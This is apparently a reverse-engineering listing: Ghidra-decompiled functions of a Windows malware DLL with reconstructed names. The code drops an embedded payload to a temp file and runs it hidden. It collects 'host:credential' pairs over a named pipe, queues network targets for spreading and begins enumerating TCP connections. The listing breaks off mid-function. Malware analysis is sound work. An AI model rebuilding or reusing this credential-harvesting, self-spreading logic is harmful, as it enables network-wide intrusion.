 * RECONSTRUCTED FUNCTION: QueueDiscoveredNetworkTarget_10006CE7
 * Ghidra symbol: FUN_10006ce7 | VA: 0x10006CE7 | original source line: 6018
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: GetProcessHeap
 * Direct function references: ProbeNetworkQueueSlot_1000724D
 */
int QueueDiscoveredNetworkTarget_10006CE7(short *param_1,short *param_2)

{
  short sVar1;
  HANDLE pvVar2;
  short *psVar3;
  DWORD DVar4;
  SIZE_T SVar5;
  LPVOID pvVar6;
  LPVOID local_14;
  LPVOID local_10;
  undefined4 local_c;
  int local_8;
  
  local_8 = 0;
  local_c = DAT_1001f108;
  psVar3 = param_1;
  do {
    sVar1 = *psVar3;
    psVar3 = psVar3 + 1;
  } while (sVar1 != 0);
  SVar5 = ((int)psVar3 - (int)(param_1 + 1) >> 1) * 2 + 2;
  DVar4 = 8;
  pvVar2 = GetProcessHeap();
  local_14 = HeapAlloc(pvVar2,DVar4,SVar5);
  if (local_14 != (LPVOID)0x0) {
    psVar3 = param_1;
    do {
      sVar1 = *psVar3;
      psVar3 = psVar3 + 1;
    } while (sVar1 != 0);
    memcpy(local_14,param_1,((int)psVar3 - (int)(param_1 + 1) >> 1) * 2 + 2);
    psVar3 = param_2;
    do {
      sVar1 = *psVar3;
      psVar3 = psVar3 + 1;
    } while (sVar1 != 0);
    SVar5 = ((int)psVar3 - (int)(param_2 + 1) >> 1) * 2 + 2;
    DVar4 = 8;
    pvVar2 = GetProcessHeap();
    local_10 = HeapAlloc(pvVar2,DVar4,SVar5);
    if (local_10 != (LPVOID)0x0) {
      psVar3 = param_2;
      do {
        sVar1 = *psVar3;
        psVar3 = psVar3 + 1;
      } while (sVar1 != 0);
      memcpy(local_10,param_2,((int)psVar3 - (int)(param_2 + 1) >> 1) * 2 + 2);
      local_8 = ProbeNetworkQueueSlot_1000724D(&local_14);
      DVar4 = 0;
      pvVar6 = local_10;
      pvVar2 = GetProcessHeap();
      HeapFree(pvVar2,DVar4,pvVar6);
    }
    DVar4 = 0;
    pvVar6 = local_14;
    pvVar2 = GetProcessHeap();
    HeapFree(pvVar2,DVar4,pvVar6);
  }
  return local_8;
}



/*
 * RECONSTRUCTED FUNCTION: QueueNetworkTargetWithCredentials_10006DE0
 * Ghidra symbol: FUN_10006de0 | VA: 0x10006DE0 | original source line: 6082
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: GetProcessHeap
 * Direct function references: AppendNetworkQueueEntry_10007298
 */
DWORD QueueNetworkTargetWithCredentials_10006DE0(short *param_1,short *param_2,undefined4 param_3)

{
  short sVar1;
  LPCRITICAL_SECTION p_Var2;
  HANDLE pvVar3;
  short *psVar4;
  DWORD DVar5;
  SIZE_T SVar6;
  LPVOID pvVar7;
  LPVOID local_10;
  LPVOID local_c;
  DWORD local_8;
  
  p_Var2 = DAT_1001f108;
  local_8 = 0;
  psVar4 = param_1;
  do {
    sVar1 = *psVar4;
    psVar4 = psVar4 + 1;
  } while (sVar1 != 0);
  SVar6 = ((int)psVar4 - (int)(param_1 + 1) >> 1) * 2 + 2;
  DVar5 = 8;
  pvVar3 = GetProcessHeap();
  local_10 = HeapAlloc(pvVar3,DVar5,SVar6);
  if (local_10 != (LPVOID)0x0) {
    psVar4 = param_1;
    do {
      sVar1 = *psVar4;
      psVar4 = psVar4 + 1;
    } while (sVar1 != 0);
    memcpy(local_10,param_1,((int)psVar4 - (int)(param_1 + 1) >> 1) * 2 + 2);
    psVar4 = param_2;
    do {
      sVar1 = *psVar4;
      psVar4 = psVar4 + 1;
    } while (sVar1 != 0);
    SVar6 = ((int)psVar4 - (int)(param_2 + 1) >> 1) * 2 + 2;
    DVar5 = 8;
    pvVar3 = GetProcessHeap();
    local_c = HeapAlloc(pvVar3,DVar5,SVar6);
    if (local_c != (LPVOID)0x0) {
      psVar4 = param_2;
      do {
        sVar1 = *psVar4;
        psVar4 = psVar4 + 1;
      } while (sVar1 != 0);
      memcpy(local_c,param_2,((int)psVar4 - (int)(param_2 + 1) >> 1) * 2 + 2);
      DVar5 = AppendNetworkQueueEntry_10007298(p_Var2,&local_10,param_3);
      if (DVar5 != 0) {
        return DVar5;
      }
      pvVar7 = local_c;
      local_8 = DVar5;
      pvVar3 = GetProcessHeap();
      HeapFree(pvVar3,DVar5,pvVar7);
    }
    DVar5 = 0;
    pvVar7 = local_10;
    pvVar3 = GetProcessHeap();
    HeapFree(pvVar3,DVar5,pvVar7);
  }
  return local_8;
}



/*
 * RECONSTRUCTED FUNCTION: CompareNetworkNameCaseInsensitive_10006EDA
 * Ghidra symbol: FUN_10006eda | VA: 0x10006EDA | original source line: 6149
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: none mapped
 */
bool CompareNetworkNameCaseInsensitive_10006EDA(LPCWSTR param_1,LPCWSTR param_2)

{
  char cVar1;
  int iVar2;
  
  if ((param_1 == (LPCWSTR)0x0) || (param_2 == (LPCWSTR)0x0)) {
    cVar1 = '\0';
  }
  else {
    iVar2 = StrCmpIW(param_1,param_2);
    cVar1 = '\x01' - (iVar2 != 0);
  }
  return (bool)cVar1;
}



/*
 * RECONSTRUCTED FUNCTION: FetchNextNetworkWorkItem_10006F02
 * Ghidra symbol: FUN_10006f02 | VA: 0x10006F02 | original source line: 6167
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: SelectNextNetworkWorkItem_10007167
 */
bool FetchNextNetworkWorkItem_10006F02(short *param_1)

{
  short sVar1;
  int iVar2;
  short *psVar3;
  short *psVar4;
  bool bVar5;
  undefined4 *local_8;
  
  local_8 = (undefined4 *)0x0;
  iVar2 = SelectNextNetworkWorkItem_10007167((int *)&local_8);
  if (iVar2 == 0) {
    bVar5 = false;
  }
  else {
    psVar3 = (short *)*local_8;
    psVar4 = param_1;
    do {
      sVar1 = *psVar3;
      *psVar4 = sVar1;
      psVar3 = psVar3 + 1;
      psVar4 = psVar4 + 1;
    } while (sVar1 != 0);
    bVar5 = param_1 != (short *)0x0;
  }
  return bVar5;
}



/*
 * RECONSTRUCTED FUNCTION: CopyAndDispatchNetworkItem_10006F40
 * Ghidra symbol: FUN_10006f40 | VA: 0x10006F40 | original source line: 6198
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateNetworkWorkItem_1000711F
 */
void CopyAndDispatchNetworkItem_10006F40(short *param_1)

{
  short sVar1;
  undefined4 *puVar2;
  short *psVar3;
  undefined4 *local_8;
  
  local_8 = (undefined4 *)0x0;
  puVar2 = AllocateNetworkWorkItem_1000711F(0,(int *)&local_8);
  if (puVar2 != (undefined4 *)0x0) {
    psVar3 = (short *)*local_8;
    do {
      sVar1 = *psVar3;
      *param_1 = sVar1;
      psVar3 = psVar3 + 1;
      param_1 = param_1 + 1;
    } while (sVar1 != 0);
  }
  return;
}



/*
 * RECONSTRUCTED FUNCTION: NetworkWorkerQueueCallback_10006F78
 * Ghidra symbol: FUN_10006f78 | VA: 0x10006F78 | original source line: 6222
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: GetProcessHeap
 * Direct function references: none mapped
 */
void NetworkWorkerQueueCallback_10006F78(LPVOID param_1)

{
  HANDLE hHeap;
  DWORD dwFlags;
  
  dwFlags = 0;
  hHeap = GetProcessHeap();
  HeapFree(hHeap,dwFlags,param_1);
  return;
}



/*
 * RECONSTRUCTED FUNCTION: NetworkWorkerQueueCallbackAlternate_10006F91
 * Ghidra symbol: FUN_10006f91 | VA: 0x10006F91 | original source line: 6236
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: ProbeNetworkQueueSlot_1000724D
 */
void __fastcall NetworkWorkerQueueCallbackAlternate_10006F91(short *param_1)

{
  short sVar1;
  int iVar2;
  short local_28 [16];
  undefined4 local_8;
  
  local_8 = 1;
  iVar2 = (int)local_28 - (int)param_1;
  do {
    sVar1 = *param_1;
    *(short *)(iVar2 + (int)param_1) = sVar1;
    param_1 = param_1 + 1;
  } while (sVar1 != 0);
  ProbeNetworkQueueSlot_1000724D(local_28);
  return;
}



/*
 * RECONSTRUCTED FUNCTION: QueueNetworkHostFromArgument_10006FC7
 * Ghidra symbol: FUN_10006fc7 | VA: 0x10006FC7 | original source line: 6257
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AppendNetworkQueueEntry_10007298
 */
undefined4 QueueNetworkHostFromArgument_10006FC7(LPCRITICAL_SECTION param_1)

{
  short sVar1;
  short *in_EAX;
  undefined4 uVar2;
  int iVar3;
  undefined4 unaff_ESI;
  short local_28 [16];
  
  if ((in_EAX == (short *)0x0) || (*in_EAX == 0)) {
    uVar2 = 0;
  }
  else {
    iVar3 = (int)local_28 - (int)in_EAX;
    do {
      sVar1 = *in_EAX;
      *(short *)(iVar3 + (int)in_EAX) = sVar1;
      in_EAX = in_EAX + 1;
    } while (sVar1 != 0);
    uVar2 = AppendNetworkQueueEntry_10007298(param_1,local_28,unaff_ESI);
  }
  return uVar2;
}



/*
 * RECONSTRUCTED FUNCTION: AllocateWorkerQueue_10007003
 * Ghidra symbol: FUN_10007003 | VA: 0x10007003 | original source line: 6284
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: GetProcessHeap
 * Direct function references: none mapped
 */
void AllocateWorkerQueue_10007003(void)

{
  int *piVar1;
  HANDLE pvVar2;
  LPVOID unaff_ESI;
  DWORD DVar3;
  LPVOID pvVar4;
  uint local_8;
  
  if (unaff_ESI != (LPVOID)0x0) {
    if (*(int *)((int)unaff_ESI + 0x18) != 0) {
      local_8 = 0;
      if (*(int *)((int)unaff_ESI + 0x24) != 0) {
        do {
          piVar1 = (int *)(*(int *)((int)unaff_ESI + 0x18) + local_8 * 4);
          if (*piVar1 != 0) {
            piVar1 = (int *)*piVar1;
            if (*piVar1 != 0) {
              if (*(code **)((int)unaff_ESI + 0x30) != (code *)0x0) {
                (**(code **)((int)unaff_ESI + 0x30))(*piVar1);
              }
              pvVar4 = (LPVOID)**(undefined4 **)(*(int *)((int)unaff_ESI + 0x18) + local_8 * 4);
              DVar3 = 0;
              pvVar2 = GetProcessHeap();
              HeapFree(pvVar2,DVar3,pvVar4);
            }
            pvVar4 = *(LPVOID *)(*(int *)((int)unaff_ESI + 0x18) + local_8 * 4);
            DVar3 = 0;
            pvVar2 = GetProcessHeap();
            HeapFree(pvVar2,DVar3,pvVar4);
          }
          local_8 = local_8 + 1;
        } while (local_8 < *(uint *)((int)unaff_ESI + 0x24));
      }
      pvVar4 = *(LPVOID *)((int)unaff_ESI + 0x18);
      DVar3 = 0;
      pvVar2 = GetProcessHeap();
      HeapFree(pvVar2,DVar3,pvVar4);
    }
    DVar3 = 0;
    pvVar2 = GetProcessHeap();
    HeapFree(pvVar2,DVar3,unaff_ESI);
  }
  return;
}



LPCRITICAL_SECTION
/*
 * RECONSTRUCTED FUNCTION: CreateWorkerQueue_10007091
 * Ghidra symbol: FUN_10007091 | VA: 0x10007091 | original source line: 6334
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: GetProcessHeap
 * Direct function references: AllocateWorkerQueue_10007003
 */
CreateWorkerQueue_10007091(LONG param_1,ULONG_PTR param_2,PRTL_CRITICAL_SECTION_DEBUG param_3,int param_4)

{
  HANDLE pvVar1;
  LPCRITICAL_SECTION lpCriticalSection;
  PRTL_CRITICAL_SECTION_DEBUG p_Var2;
  DWORD DVar3;
  SIZE_T SVar4;
  
  SVar4 = 0x34;
  DVar3 = 8;
  pvVar1 = GetProcessHeap();
  lpCriticalSection = HeapAlloc(pvVar1,DVar3,SVar4);
  if (lpCriticalSection != (LPCRITICAL_SECTION)0x0) {
    InitializeCriticalSection(lpCriticalSection);
    lpCriticalSection[1].RecursionCount = param_4;
    lpCriticalSection[1].LockCount = param_1;
    SVar4 = param_4 << 2;
    lpCriticalSection[1].SpinCount = param_2;
    DVar3 = 8;
    lpCriticalSection[1].OwningThread = (HANDLE)0x0;
    lpCriticalSection[2].DebugInfo = param_3;
    pvVar1 = GetProcessHeap();
    p_Var2 = HeapAlloc(pvVar1,DVar3,SVar4);
    lpCriticalSection[1].DebugInfo = p_Var2;
    if (p_Var2 == (PRTL_CRITICAL_SECTION_DEBUG)0x0) {
      AllocateWorkerQueue_10007003();
      lpCriticalSection = (LPCRITICAL_SECTION)0x0;
    }
  }
  return lpCriticalSection;
}



/*
 * RECONSTRUCTED FUNCTION: SynchronizeWorkerThreads_100070FA
 * Ghidra symbol: FUN_100070fa | VA: 0x100070FA | original source line: 6369
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: none mapped
 */
undefined4 SynchronizeWorkerThreads_100070FA(void)

{
  LPCRITICAL_SECTION unaff_ESI;
  
  if (unaff_ESI == (LPCRITICAL_SECTION)0x0) {
    return 0;
  }
  EnterCriticalSection(unaff_ESI);
  InterlockedExchange((LONG *)&unaff_ESI[1].LockSemaphore,1);
  LeaveCriticalSection(unaff_ESI);
  return 1;
}



/*
 * RECONSTRUCTED FUNCTION: AllocateNetworkWorkItem_1000711F
 * Ghidra symbol: FUN_1000711f | VA: 0x1000711F | original source line: 6385
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: GetProcessHeap
 * Direct function references: SelectNextNetworkWorkItem_10007167
 */
undefined4 * AllocateNetworkWorkItem_1000711F(undefined4 param_1,int *param_2)

{
  HANDLE pvVar1;
  undefined4 *lpMem;
  int iVar2;
  undefined4 *puVar3;
  DWORD DVar4;
  SIZE_T dwBytes;
  
  dwBytes = 8;
  DVar4 = 8;
  pvVar1 = GetProcessHeap();
  lpMem = HeapAlloc(pvVar1,DVar4,dwBytes);
  puVar3 = lpMem;
  if (lpMem != (undefined4 *)0x0) {
    *lpMem = 0;
    lpMem[1] = param_1;
    iVar2 = SelectNextNetworkWorkItem_10007167(param_2);
    if (iVar2 == 0) {
      puVar3 = (undefined4 *)0x0;
      DVar4 = 0;
      pvVar1 = GetProcessHeap();
      HeapFree(pvVar1,DVar4,lpMem);
    }
  }
  return puVar3;
}



/*
 * RECONSTRUCTED FUNCTION: SelectNextNetworkWorkItem_10007167
 * Ghidra symbol: FUN_10007167 | VA: 0x10007167 | original source line: 6416
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: none mapped
 */
int SelectNextNetworkWorkItem_10007167(int *param_1)

{
  HANDLE pvVar1;
  int iVar2;
  uint uVar3;
  uint *unaff_EBX;
  LPCRITICAL_SECTION unaff_ESI;
  int iVar4;
  
  if ((unaff_EBX == (uint *)0x0) || (unaff_ESI == (LPCRITICAL_SECTION)0x0)) {
    return 0;
  }
  do {
    iVar4 = 0;
    EnterCriticalSection(unaff_ESI);
    do {
      pvVar1 = (HANDLE)*unaff_EBX;
      if (unaff_ESI[1].OwningThread <= pvVar1) break;
      iVar2 = *(int *)(&(unaff_ESI[1].DebugInfo)->Type + (int)pvVar1 * 2);
      uVar3 = *(uint *)(iVar2 + 4);
      if ((uVar3 == 0) || ((unaff_EBX[1] & uVar3) != 0)) {
        iVar4 = 1;
        if (param_1 != (int *)0x0) {
          *param_1 = iVar2;
        }
      }
      else {
        iVar4 = 0;
      }
      *unaff_EBX = (int)pvVar1 + 1;
    } while (iVar4 == 0);
    LeaveCriticalSection(unaff_ESI);
    if (iVar4 != 0) {
      return iVar4;
    }
    if (unaff_ESI[1].LockSemaphore != (HANDLE)0x0) {
      return 0;
    }
    Sleep(10000);
  } while( true );
}



/*
 * RECONSTRUCTED FUNCTION: SelectNetworkQueueSlot_100071D6
 * Ghidra symbol: FUN_100071d6 | VA: 0x100071D6 | original source line: 6461
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: none mapped
 */
int SelectNetworkQueueSlot_100071D6(undefined4 param_1,undefined4 *param_2)

{
  uint in_EAX;
  LPCRITICAL_SECTION unaff_ESI;
  uint uVar1;
  int local_8;
  
  local_8 = 0;
  if (unaff_ESI != (LPCRITICAL_SECTION)0x0) {
    EnterCriticalSection(unaff_ESI);
    uVar1 = in_EAX;
    if (in_EAX < (int)unaff_ESI[1].OwningThread + in_EAX) {
      do {
        local_8 = (*(code *)unaff_ESI[1].SpinCount)
                            (**(undefined4 **)
                               (&(unaff_ESI[1].DebugInfo)->Type +
                               (uVar1 % (uint)unaff_ESI[1].OwningThread) * 2),param_1,
                             unaff_ESI[1].LockCount);
        if (local_8 != 0) {
          if (param_2 != (undefined4 *)0x0) {
            *param_2 = *(undefined4 *)
                        (&(unaff_ESI[1].DebugInfo)->Type +
                        (uVar1 % (uint)unaff_ESI[1].OwningThread) * 2);
          }
          break;
        }
        uVar1 = uVar1 + 1;
      } while (uVar1 < (int)unaff_ESI[1].OwningThread + in_EAX);
    }
    LeaveCriticalSection(unaff_ESI);
  }
  return local_8;
}



/*
 * RECONSTRUCTED FUNCTION: ProbeNetworkQueueSlot_1000724D
 * Ghidra symbol: FUN_1000724d | VA: 0x1000724D | original source line: 6498
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: SelectNetworkQueueSlot_100071D6
 */
int ProbeNetworkQueueSlot_1000724D(undefined4 param_1)

{
  LPCRITICAL_SECTION in_EAX;
  int iVar1;
  int local_8;
  
  iVar1 = 0;
  if (in_EAX != (LPCRITICAL_SECTION)0x0) {
    EnterCriticalSection(in_EAX);
    local_8 = 0;
    iVar1 = SelectNetworkQueueSlot_100071D6(param_1,&local_8);
    if (iVar1 != 0) {
      *(undefined4 *)(local_8 + 4) = 1;
    }
    LeaveCriticalSection(in_EAX);
  }
  return iVar1;
}



/*
 * RECONSTRUCTED FUNCTION: AppendNetworkQueueEntry_10007298
 * Ghidra symbol: FUN_10007298 | VA: 0x10007298 | original source line: 6520
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: GetProcessHeap
 * Direct function references: SelectNetworkQueueSlot_100071D6
 */
undefined4 AppendNetworkQueueEntry_10007298(LPCRITICAL_SECTION param_1,void *param_2,undefined4 param_3)

{
  int iVar1;
  HANDLE pvVar2;
  LPVOID pvVar3;
  PRTL_CRITICAL_SECTION_DEBUG p_Var4;
  DWORD DVar5;
  SIZE_T SVar6;
  undefined4 local_8;
  
  local_8 = 0;
  if ((param_1 != (LPCRITICAL_SECTION)0x0) && (param_2 != (void *)0x0)) {
    EnterCriticalSection(param_1);
    iVar1 = SelectNetworkQueueSlot_100071D6(param_2,(undefined4 *)0x0);
    if (iVar1 == 0) {
      if (param_1[1].OwningThread < (HANDLE)param_1[1].RecursionCount) {
        SVar6 = 8;
        DVar5 = 8;
        pvVar2 = GetProcessHeap();
        pvVar3 = HeapAlloc(pvVar2,DVar5,SVar6);
        *(LPVOID *)(&(param_1[1].DebugInfo)->Type + (int)param_1[1].OwningThread * 2) = pvVar3;
        if (pvVar3 != (LPVOID)0x0) {
          SVar6 = param_1[1].LockCount;
          DVar5 = 8;
          pvVar2 = GetProcessHeap();
          pvVar3 = HeapAlloc(pvVar2,DVar5,SVar6);
          **(undefined4 **)(&(param_1[1].DebugInfo)->Type + (int)param_1[1].OwningThread * 2) =
               pvVar3;
          if (pvVar3 == (LPVOID)0x0) {
            pvVar3 = *(LPVOID *)(&(param_1[1].DebugInfo)->Type + (int)param_1[1].OwningThread * 2);
            DVar5 = 0;
            pvVar2 = GetProcessHeap();
            HeapFree(pvVar2,DVar5,pvVar3);
          }
          else {
            *(undefined4 *)
             (*(int *)(&(param_1[1].DebugInfo)->Type + (int)param_1[1].OwningThread * 2) + 4) =
                 param_3;
            memcpy((void *)**(undefined4 **)
                             (&(param_1[1].DebugInfo)->Type + (int)param_1[1].OwningThread * 2),
                   param_2,param_1[1].LockCount);
            param_1[1].OwningThread = (HANDLE)((int)param_1[1].OwningThread + 1);
            local_8 = 1;
          }
        }
      }
      else {
        SVar6 = param_1[1].RecursionCount * 4 + 0x3fc;
        p_Var4 = param_1[1].DebugInfo;
        DVar5 = 8;
        pvVar2 = GetProcessHeap();
        p_Var4 = HeapReAlloc(pvVar2,DVar5,p_Var4,SVar6);
        if (p_Var4 != (PRTL_CRITICAL_SECTION_DEBUG)0x0) {
          param_1[1].DebugInfo = p_Var4;
          param_1[1].RecursionCount = param_1[1].RecursionCount + 0xff;
          local_8 = AppendNetworkQueueEntry_10007298(param_1,param_2,param_3);
        }
      }
    }
    LeaveCriticalSection(param_1);
  }
  return local_8;
}



/*
 * RECONSTRUCTED FUNCTION: WriteTemporaryResourceFile_100073AE
 * Ghidra symbol: FUN_100073ae | VA: 0x100073AE | original source line: 6587
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: CreateFileW, WriteFile
 * Direct function references: none mapped
 */
undefined4 WriteTemporaryResourceFile_100073AE(LPCWSTR param_1,LPCVOID param_2)

{
  HANDLE hFile;
  BOOL BVar1;
  LPCWSTR unaff_EBX;
  undefined4 uVar2;
  
  uVar2 = 0;
  hFile = CreateFileW(param_1,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,2,(HANDLE)0x0);
  if (hFile != (HANDLE)0xffffffff) {
    param_1 = (LPCWSTR)0x0;
    BVar1 = WriteFile(hFile,param_2,(DWORD)unaff_EBX,(LPDWORD)&param_1,(LPOVERLAPPED)0x0);
    if ((BVar1 != 0) && (unaff_EBX == param_1)) {
      uVar2 = 1;
    }
    CloseHandle(hFile);
  }
  return uVar2;
}



/*
 * RECONSTRUCTED FUNCTION: NamedPipeReadWorker_100073FD
 * Ghidra symbol: FUN_100073fd | VA: 0x100073FD | original source line: 6610
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: GetProcessHeap, CreateNamedPipeW, ReadFile
 * Direct function references: QueueNetworkTargetWithCredentials_10006DE0
 */
undefined4 NamedPipeReadWorker_100073FD(LPCWSTR param_1)

{
  HANDLE pvVar1;
  BOOL BVar2;
  LPCWSTR lpStart;
  LPWSTR pWVar3;
  int iVar4;
  DWORD DVar5;
  DWORD dwFlags;
  SIZE_T dwBytes;
  _SECURITY_ATTRIBUTES local_1c;
  DWORD local_10;
  DWORD local_c;
  HANDLE local_8;
  
  local_1c.lpSecurityDescriptor = (LPVOID)0x0;
  dwBytes = 0x14;
  DVar5 = 8;
  local_1c.nLength = 0xc;
  local_1c.bInheritHandle = 0;
  pvVar1 = GetProcessHeap();
  local_1c.lpSecurityDescriptor = HeapAlloc(pvVar1,DVar5,dwBytes);
  if (((local_1c.lpSecurityDescriptor == (LPVOID)0x0) ||
      (BVar2 = InitializeSecurityDescriptor(local_1c.lpSecurityDescriptor,1), BVar2 == 0)) ||
     (BVar2 = SetSecurityDescriptorDacl(local_1c.lpSecurityDescriptor,1,(PACL)0x0,0), BVar2 == 0)) {
    return 0;
  }
  do {
    do {
      local_8 = CreateNamedPipeW(param_1,3,6,1,0,0,0,&local_1c);
    } while (local_8 == (HANDLE)0xffffffff);
    BVar2 = ConnectNamedPipe(local_8,(LPOVERLAPPED)0x0);
    if (BVar2 != 0) {
      iVar4 = 0x1e;
      do {
        iVar4 = iVar4 + -1;
        local_c = 0;
        BVar2 = PeekNamedPipe(local_8,(LPVOID)0x0,0,(LPDWORD)0x0,&local_c,(LPDWORD)0x0);
        if (BVar2 != 0) {
          if (local_c != 0) {
            dwFlags = 8;
            DVar5 = local_c;
            pvVar1 = GetProcessHeap();
            lpStart = HeapAlloc(pvVar1,dwFlags,DVar5);
            if (lpStart != (LPCWSTR)0x0) {
              local_10 = 0;
              BVar2 = ReadFile(local_8,lpStart,local_c,&local_10,(LPOVERLAPPED)0x0);
              if (((BVar2 != 0) && (local_10 == local_c)) &&
                 (pWVar3 = StrChrW(lpStart,L':'), pWVar3 != (LPWSTR)0x0)) {
                *pWVar3 = L'\0';
                QueueNetworkTargetWithCredentials_10006DE0(lpStart,pWVar3 + 1,2);
              }
              DVar5 = 0;
              pvVar1 = GetProcessHeap();
              HeapFree(pvVar1,DVar5,lpStart);
            }
            break;
          }
          Sleep(1000);
        }
      } while (iVar4 != 0);
      FlushFileBuffers(local_8);
      DisconnectNamedPipe(local_8);
    }
    CloseHandle(local_8);
  } while( true );
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

/*
 * RECONSTRUCTED FUNCTION: LaunchEmbeddedAuxiliaryResource_10007545
 * Ghidra symbol: FUN_10007545 | VA: 0x10007545 | original source line: 6683
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: GetCurrentProcess, GetModuleHandleW, GetProcAddress, FindResourceW, GetTempPathW, GetTempFileNameW, CreateThread, CreateProcessW, GetProcessHeap
 * Direct function references: SynchronizeWorkerThreads_100070FA, WriteTemporaryResourceFile_100073AE, NamedPipeReadWorker_100073FD, DecompressWin32Resource_100085D0
 */
void LaunchEmbeddedAuxiliaryResource_10007545(void)

{
  SIZE_T SVar1;
  HANDLE pvVar2;
  HMODULE hModule;
  FARPROC pFVar3;
  HRSRC pHVar4;
  int iVar5;
  DWORD DVar6;
  UINT UVar7;
  HRESULT HVar8;
  BOOL BVar9;
  char *lpProcName;
  undefined1 *puVar10;
  WCHAR local_1aa4 [1024];
  WCHAR local_12a4 [1024];
  WCHAR local_aa4 [520];
  WCHAR local_694 [780];
  _STARTUPINFOW local_7c;
  _PROCESS_INFORMATION local_38;
  GUID local_28;
  HANDLE local_18;
  int local_14;
  LPOLESTR local_10;
  undefined1 *local_c;
  SIZE_T local_8;
  
  local_c = (undefined1 *)0x0;
  local_8 = 0;
  pvVar2 = GetCurrentProcess();
  lpProcName = "IsWow64Process";
  local_14 = 0;
  hModule = GetModuleHandleW(L"kernel32.dll");
  pFVar3 = GetProcAddress(hModule,lpProcName);
  if (pFVar3 != (FARPROC)0x0) {
    (*pFVar3)(pvVar2,&local_14);
  }
  pHVar4 = FindResourceW(DAT_1001f120,(LPCWSTR)((local_14 != 0) + 1),(LPCWSTR)0xa);
  if (pHVar4 == (HRSRC)0x0) {
    iVar5 = 0;
  }
  else {
    iVar5 = DecompressWin32Resource_100085D0(&local_8,pHVar4);
  }
  if (iVar5 != 0) {
    DVar6 = GetTempPathW(0x208,local_aa4);
    puVar10 = local_c;
    SVar1 = local_8;
    if ((DVar6 != 0) &&
       (UVar7 = GetTempFileNameW(local_aa4,(LPCWSTR)0x0,0,local_694), puVar10 = local_c,
       SVar1 = local_8, UVar7 != 0)) {
      local_28.Data1 = 0;
      local_28.Data2 = 0;
      local_28.Data3 = 0;
      local_28.Data4[0] = '\0';
      local_28.Data4[1] = '\0';
      local_28.Data4[2] = '\0';
      local_28.Data4[3] = '\0';
      local_28.Data4[4] = '\0';
      local_28.Data4[5] = '\0';
      local_28.Data4[6] = '\0';
      local_28.Data4[7] = '\0';
      HVar8 = CoCreateGuid(&local_28);
      puVar10 = local_c;
      SVar1 = local_8;
      if (-1 < HVar8) {
        local_10 = (LPOLESTR)0x0;
        HVar8 = StringFromCLSID(&local_28,&local_10);
        puVar10 = local_c;
        SVar1 = local_8;
        if (-1 < HVar8) {
          iVar5 = WriteTemporaryResourceFile_100073AE(local_694,local_c);
          if (iVar5 != 0) {
            wsprintfW(local_12a4,L"\\\\.\\pipe\\%ws",local_10);
            local_18 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,NamedPipeReadWorker_100073FD,local_12a4,0,
                                    (LPDWORD)0x0);
            puVar10 = local_c;
            SVar1 = local_8;
            if (local_18 != (HANDLE)0x0) {
              local_38.hProcess = (HANDLE)0x0;
              local_38.hThread = (HANDLE)0x0;
              local_38.dwProcessId = 0;
              local_38.dwThreadId = 0;
              memset(&local_7c,0,0x44);
              local_7c.wShowWindow = 0;
              local_7c.cb = 0x44;
              wsprintfW(local_1aa4,L"\"%ws\" %ws",local_694,local_12a4);
              BVar9 = CreateProcessW(local_694,local_1aa4,(LPSECURITY_ATTRIBUTES)0x0,
                                     (LPSECURITY_ATTRIBUTES)0x0,0,0x8000000,(LPVOID)0x0,(LPCWSTR)0x0
                                     ,&local_7c,&local_38);
              if (BVar9 != 0) {
                WaitForSingleObject(local_38.hProcess,60000);
                SynchronizeWorkerThreads_100070FA();
                TerminateThread(local_18,0);
              }
              CloseHandle(local_18);
              puVar10 = local_c;
              SVar1 = local_8;
            }
            for (; SVar1 != 0; SVar1 = SVar1 - 1) {
              *puVar10 = 0;
              puVar10 = puVar10 + 1;
            }
            WriteTemporaryResourceFile_100073AE(local_694,local_c);
            DeleteFileW(local_694);
          }
          CoTaskMemFree(local_10);
          puVar10 = local_c;
          SVar1 = local_8;
        }
      }
    }
    for (; SVar1 != 0; SVar1 = SVar1 - 1) {
      *puVar10 = 0;
      puVar10 = puVar10 + 1;
    }
    DVar6 = 0;
    puVar10 = local_c;
    pvVar2 = GetProcessHeap();
    HeapFree(pvVar2,DVar6,puVar10);
  }
  return;
}



/*
 * RECONSTRUCTED FUNCTION: EnumerateTcpConnectionCandidates_1000777B
 * Ghidra symbol: FUN_1000777b | VA: 0x1000777B | original source line: 6810
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: GetProcAddress, GetLastError, GetProcessHeap
 * Direct function references: QueueNetworkHostFromArgument_10006FC7
 */
bool EnumerateTcpConnectionCandidates_1000777B(LPCRITICAL_SECTION param_1)

{
  FARPROC pFVar1;
  HANDLE pvVar2;
  uint *lpMem;
  int iVar3;
  byte *pbVar4;
  bool bVar5;
  DWORD DVar6;
  SIZE_T dwBytes;
  WCHAR local_54 [32];
  HMODULE local_14;
  uint *local_10;
  undefined4 local_c;
  uint local_8;
  
  bVar5 = false;
  local_14 = LoadLibraryW(L"iphlpapi.dll");
  if (local_14 != (HMODULE)0x0) {
